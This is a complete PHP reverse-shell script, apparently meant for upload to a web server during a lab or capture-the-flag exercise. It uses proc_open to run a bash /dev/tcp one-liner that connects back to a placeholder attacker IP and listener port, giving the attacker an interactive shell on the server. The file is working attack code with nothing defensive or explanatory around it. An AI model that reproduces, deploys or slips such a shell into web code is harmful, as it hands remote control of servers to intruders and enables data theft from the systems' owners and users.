<?php
// Reverse shell using proc_open()

$ip = "10.10.14.30";   // change to your attacker IP
$port = 9001;         // change to your listener port

$cmd = "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'";
$descriptorspec = array(
    0 => array("pipe", "r"),  // stdin
    1 => array("pipe", "w"),  // stdout
    2 => array("pipe", "w")   // stderr
);

$process = proc_open($cmd, $descriptorspec, $pipes);
?>
